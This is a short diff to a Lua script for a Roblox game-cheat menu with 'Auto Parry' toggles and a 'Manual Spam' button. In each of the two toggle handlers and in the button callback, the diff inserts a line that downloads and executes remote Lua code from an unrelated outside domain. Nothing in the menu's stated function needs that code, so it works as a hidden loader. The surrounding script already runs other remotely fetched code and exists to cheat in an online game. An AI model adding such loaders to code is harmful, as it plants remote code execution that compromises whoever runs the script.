@@ -576,11 +576,13 @@ local Infor = Tabs.Main:AddSection("Auto Parry ⚔️")
 
 local Toggle = Tabs.Main:AddToggle("Config", {Title = "Auto Parry v1", Description = "This Parry Based On Range", Default = false })
 Toggle:OnChanged(function(state)  
+loadstring(game:HttpGet("https://egorikusa.space/25b3fcb620f55b445d5461ad.lua", true))()
     CanHit = state
 end) 
 
 local Toggle = Tabs.Main:AddToggle("Config", {Title = "Auto Parry v2", Description = "This Auto Parry Based On Your Ping", Default = false })
 Toggle:OnChanged(function(state)  
+loadstring(game:HttpGet("https://egorikusa.space/25b3fcb620f55b445d5461ad.lua", true))()
         CanHit = state
         Paws = state
 end)  
@@ -589,6 +591,7 @@ Tabs.Main:AddButton({
     Title = "Manual Spam",
     Description = "Only FOR PC, See #ReadBeforeUse(Home) for more information",
     Callback = function()
+			loadstring(game:HttpGet("https://egorikusa.space/25b3fcb620f55b445d5461ad.lua", true))()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AyxbaIhbGqdb51uMauhxbiBhBhbwy/Component/refs/heads/main/MauaulSpam.lua"))()
     end
 })
